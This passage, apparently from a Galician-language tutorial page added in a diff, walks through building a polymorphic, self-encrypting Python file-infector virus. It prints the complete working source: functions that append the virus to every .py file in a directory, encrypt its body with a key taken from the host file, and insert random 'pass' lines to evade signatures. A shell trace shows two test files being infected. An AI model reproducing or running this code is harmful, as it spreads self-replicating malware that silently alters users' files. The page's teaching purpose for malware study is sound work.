+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">borra_pass</span>(codigo):
+    codigo_sen_pass <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> linha <span style="color:#f92672">in</span> codigo<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>)):
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;pass&#34;</span> <span style="color:#f92672">in</span> linha:
+            codigo_sen_pass<span style="color:#f92672">.</span>append(linha)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(codigo_sen_pass)
+</code></pre></div><ul>
+<li>Función <strong>calcula_tabulacion</strong>: esta función calcula o número de espazos que preceden a un “pass” cando se insire.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcula_tabulacion</span>(codigo, posicion):
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;else&#34;</span> <span style="color:#f92672">in</span> codigo[posicion] <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;elif&#34;</span> <span style="color:#f92672">in</span> codigo[posicion]:
+        <span style="color:#66d9ef">return</span> len(codigo[posicion]) <span style="color:#f92672">-</span> len(codigo[posicion]<span style="color:#f92672">.</span>lstrip()) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+    <span style="color:#66d9ef">return</span> len(codigo[posicion]) <span style="color:#f92672">-</span> len(codigo[posicion]<span style="color:#f92672">.</span>lstrip())
+</code></pre></div><ul>
+<li>Función <strong>engade_pass</strong>: esta función é a que coloca aleatoriamente os “pass” no código que non se cifra.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">engade_pass</span>(codigo):
+    <span style="color:#f92672">import</span> random
+    linhas <span style="color:#f92672">=</span> codigo<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+        <span style="color:#66d9ef">if</span> random<span style="color:#f92672">.</span>random() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.75</span>:
+            posicion_insecion <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, len(linhas) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+            linhas<span style="color:#f92672">.</span>insert(posicion_insecion, <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> calcula_tabulacion(linhas, posicion_insecion) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pass&#34;</span>)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(linhas)
+</code></pre></div><ul>
+<li>Función <strong>modifica</strong>: esta función é a encargada de borrar os “pass” previos e engadir os novos a cada unha das 
+funcións que non se cifran.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modifica</span>(codigo):
+    novo_codigo <span style="color:#f92672">=</span> []
+    separador <span style="color:#f92672">=</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>)
+    funcions <span style="color:#f92672">=</span> codigo<span style="color:#f92672">.</span>split(separador)
+    <span style="color:#66d9ef">for</span> texto <span style="color:#f92672">in</span> funcions:
+        <span style="color:#66d9ef">if</span> texto:
+            codigo_sen_pass <span style="color:#f92672">=</span> borra_pass(texto)
+            codigo_con_pass <span style="color:#f92672">=</span> engade_pass(codigo_sen_pass)
+            novo_codigo<span style="color:#f92672">.</span>append(codigo_con_pass)
+        <span style="color:#66d9ef">else</span>:
+            novo_codigo<span style="color:#f92672">.</span>append(texto)
+    <span style="color:#66d9ef">return</span> separador<span style="color:#f92672">.</span>join(novo_codigo)
+</code></pre></div><p>Función <strong>infectar</strong>: esta función fai o mesmo ca antes, pero agora:</p>
+<ul>
+<li>En vez de obter a parte e claro e a parte a cifrar mediante un valor fixo, obtense buscando a posición da función 
+cifra.</li>
+<li>Chamase a función modifica para que o código que non se cifre sexa diferente.</li>
+<li>O código do descifrador xa non ten o valor fixo para indicar a lonxitude da parte descifrada; agora calculase en 
+función do tamaño do código modificado.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infectar</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> arquivo <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> arquivo<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(arquivo, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            texto_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> texto_script:
+                parte_en_claro <span style="color:#f92672">=</span> virus[:virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def cifra&#34;</span>)]
+                parte_a_cifrar <span style="color:#f92672">=</span> virus[virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def cifra&#34;</span>):]
+                parte_en_claro_modificada <span style="color:#f92672">=</span> modifica(parte_en_claro)
+                clave <span style="color:#f92672">=</span> calcula_clave(texto_script)
+                parte_crifrada <span style="color:#f92672">=</span> cifra(parte_a_cifrar, clave)
+                script<span style="color:#f92672">.</span>write(parte_en_claro_modificada)
+                descrifrador <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_portador = portador.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;parte_sin_cifrar = texto_portador[texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+&#34;</span> <span style="color:#f92672">+</span> str(len(parte_en_claro_modificada)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;clave = calcula_clave(texto_portador)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_descifrado = descifra(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> parte_crifrada <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, clave)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(texto_descifrado)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;executa(parte_sin_cifrar + texto_descifrado)&#34;</span>
+                script<span style="color:#f92672">.</span>write(descrifrador)
+            script<span style="color:#f92672">.</span>close()
+</code></pre></div><p>O resto de funcións do xerme (calcula_clave, descifra, cifra, payload e executa) e código global non se modificaron. 
+Dito isto, o código completo deste xerme é o seguinte:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcula_clave</span>(texto):
+    <span style="color:#66d9ef">if</span> len(texto) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        clave <span style="color:#f92672">=</span> ord(texto[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        clave <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> clave
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">descifra</span>(texto, clave):
+    texto_descifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_descifrado
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cifra</span>(texto, clave):
+    texto_cifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
+            texto_cifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">+</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            texto_cifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">+</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_cifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_cifrado
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">borra_pass</span>(codigo):
+    codigo_sen_pass <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> linha <span style="color:#f92672">in</span> codigo<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>)):
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;pass&#34;</span> <span style="color:#f92672">in</span> linha:
+            codigo_sen_pass<span style="color:#f92672">.</span>append(linha)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(codigo_sen_pass)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcula_tabulacion</span>(codigo, posicion):
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;else&#34;</span> <span style="color:#f92672">in</span> codigo[posicion] <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;elif&#34;</span> <span style="color:#f92672">in</span> codigo[posicion]:
+        <span style="color:#66d9ef">return</span> len(codigo[posicion]) <span style="color:#f92672">-</span> len(codigo[posicion]<span style="color:#f92672">.</span>lstrip()) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+    <span style="color:#66d9ef">return</span> len(codigo[posicion]) <span style="color:#f92672">-</span> len(codigo[posicion]<span style="color:#f92672">.</span>lstrip())
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">engade_pass</span>(codigo):
+    <span style="color:#f92672">import</span> random
+    linhas <span style="color:#f92672">=</span> codigo<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+        <span style="color:#66d9ef">if</span> random<span style="color:#f92672">.</span>random() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.75</span>:
+            posicion_insecion <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, len(linhas) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+            linhas<span style="color:#f92672">.</span>insert(posicion_insecion, <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> calcula_tabulacion(linhas, posicion_insecion) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pass&#34;</span>)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(linhas)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modifica</span>(codigo):
+    novo_codigo <span style="color:#f92672">=</span> []
+    separador <span style="color:#f92672">=</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>)
+    funcions <span style="color:#f92672">=</span> codigo<span style="color:#f92672">.</span>split(separador)
+    <span style="color:#66d9ef">for</span> texto <span style="color:#f92672">in</span> funcions:
+        <span style="color:#66d9ef">if</span> texto:
+            codigo_sen_pass <span style="color:#f92672">=</span> borra_pass(texto)
+            codigo_con_pass <span style="color:#f92672">=</span> engade_pass(codigo_sen_pass)
+            novo_codigo<span style="color:#f92672">.</span>append(codigo_con_pass)
+        <span style="color:#66d9ef">else</span>:
+            novo_codigo<span style="color:#f92672">.</span>append(texto)
+    <span style="color:#66d9ef">return</span> separador<span style="color:#f92672">.</span>join(novo_codigo)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infectar</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> arquivo <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> arquivo<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(arquivo, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            texto_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> texto_script:
+                parte_en_claro <span style="color:#f92672">=</span> virus[:virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def cifra&#34;</span>)]
+                parte_a_cifrar <span style="color:#f92672">=</span> virus[virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def cifra&#34;</span>):]
+                parte_en_claro_modificada <span style="color:#f92672">=</span> modifica(parte_en_claro)
+                clave <span style="color:#f92672">=</span> calcula_clave(texto_script)
+                parte_crifrada <span style="color:#f92672">=</span> cifra(parte_a_cifrar, clave)
+                script<span style="color:#f92672">.</span>write(parte_en_claro_modificada)
+                descrifrador <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_portador = portador.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;parte_sin_cifrar = texto_portador[texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+&#34;</span> <span style="color:#f92672">+</span> str(len(parte_en_claro_modificada)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;clave = calcula_clave(texto_portador)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_descifrado = descifra(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> parte_crifrada <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, clave)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(texto_descifrado)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;executa(parte_sin_cifrar + texto_descifrado)&#34;</span>
+                script<span style="color:#f92672">.</span>write(descrifrador)
+            script<span style="color:#f92672">.</span>close()
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Fuches infectado&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">executa</span>(virus):
+    infectar(virus)
+    payload()
+
+
+<span style="color:#f92672">import</span> sys
+portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> texto_portador[:<span style="color:#ae81ff">3621</span>]
+executa(virus)
+</code></pre></div><p>Se o executamos o xerme nun cartafol con varios arquivos con extensión .py obteremos a seguinte traza:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus3$ ls -las
+total <span style="color:#ae81ff">20</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 18:26 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 17:58 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">39</span> Dec <span style="color:#ae81ff">13</span> 18:26 Ola2.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">20</span> Dec <span style="color:#ae81ff">13</span> 17:57 Ola.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">3764</span> Dec <span style="color:#ae81ff">13</span> 18:16 virus.py
+probasvx@probasvx:~/virus3$ cat Ola.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Ola mundo!&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus3$ cat Ola2.py 
+<span style="color:#75715e"># Comentario</span>
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Ola outra vez :)&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus3$ python3 virus.py 
+Fuches infectado
+probasvx@probasvx:~/virus3$ ls -las
+total <span style="color:#ae81ff">28</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 18:26 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 17:58 ..
+<span style="color:#ae81ff">8</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">4123</span> Dec <span style="color:#ae81ff">13</span> 18:27 Ola2.py
+<span style="color:#ae81ff">8</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">4113</span> Dec <span style="color:#ae81ff">13</span> 18:27 Ola.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">3764</span> Dec <span style="color:#ae81ff">13</span> 18:16 virus.py
+</code></pre></div><p>Na traza pódese observar que o tamaño do ficheiro Ola2.py, antes da execución do virus, tiña 19 bytes máis ca Ola.py. 
+Despois da execución do virus, Ola2.py pasou a ter só 10 bytes máis. Isto débese á cantidade e posición de “pass” 
+inseridos no código que non se cifra do virus. A continuación móstranse os códigos de cada ficheiro:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus3$ cat Ola.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Ola mundo!&#34;</span><span style="color:#f92672">)</span>
+def calcula_clave<span style="color:#f92672">(</span>texto<span style="color:#f92672">)</span>:
+    pass
+    <span style="color:#66d9ef">if</span> len<span style="color:#f92672">(</span>texto<span style="color:#f92672">)</span> &gt;<span style="color:#f92672">=</span> 3:
+        clave <span style="color:#f92672">=</span> ord<span style="color:#f92672">(</span>texto<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>texto<span style="color:#f92672">[</span>1<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>texto<span style="color:#f92672">[</span>2<span style="color:#f92672">])</span>
+        pass
+        pass
+        pass
+    <span style="color:#66d9ef">else</span>:
+        clave <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> clave
+
+
+def descifra<span style="color:#f92672">(</span>texto, clave<span style="color:#f92672">)</span>:
+    texto_descifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter in texto:
+        <span style="color:#66d9ef">if</span> caracter.isupper<span style="color:#f92672">()</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>caracter<span style="color:#f92672">)</span> - clave - 65<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 65<span style="color:#f92672">)</span>
+        <span style="color:#66d9ef">elif</span> caracter.islower<span style="color:#f92672">()</span>:
+            pass
+            pass
+            pass
+            texto_descifrado <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>caracter<span style="color:#f92672">)</span> - clave - 97<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 97<span style="color:#f92672">)</span>
+        <span style="color:#66d9ef">else</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> caracter
+    pass
+    <span style="color:#66d9ef">return</span> texto_descifrado
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus3$ cat Ola2.py 
+<span style="color:#75715e"># Comentario</span>
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Ola outra vez :)&#34;</span><span style="color:#f92672">)</span>
+def calcula_clave<span style="color:#f92672">(</span>texto<span style="color:#f92672">)</span>:
+    pass
+    pass
+    <span style="color:#66d9ef">if</span> len<span style="color:#f92672">(</span>texto<span style="color:#f92672">)</span> &gt;<span style="color:#f92672">=</span> 3:
+        pass
+        clave <span style="color:#f92672">=</span> ord<span style="color:#f92672">(</span>texto<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>texto<span style="color:#f92672">[</span>1<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>texto<span style="color:#f92672">[</span>2<span style="color:#f92672">])</span>
+    <span style="color:#66d9ef">else</span>:
+        clave <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> clave
+
+
+def descifra<span style="color:#f92672">(</span>texto, clave<span style="color:#f92672">)</span>:
+    texto_descifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter in texto:
+        <span style="color:#66d9ef">if</span> caracter.isupper<span style="color:#f92672">()</span>:
+            pass
+            pass
+            pass
+            texto_descifrado <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>caracter<span style="color:#f92672">)</span> - clave - 65<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 65<span style="color:#f92672">)</span>
+        <span style="color:#66d9ef">elif</span> caracter.islower<span style="color:#f92672">()</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>caracter<span style="color:#f92672">)</span> - clave - 97<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 97<span style="color:#f92672">)</span>
+        <span style="color:#66d9ef">else</span>:
+            pass
+            texto_descifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_descifrado
+</code></pre></div><p>O código completo dun arquivo infectado é o seguinte:</p>
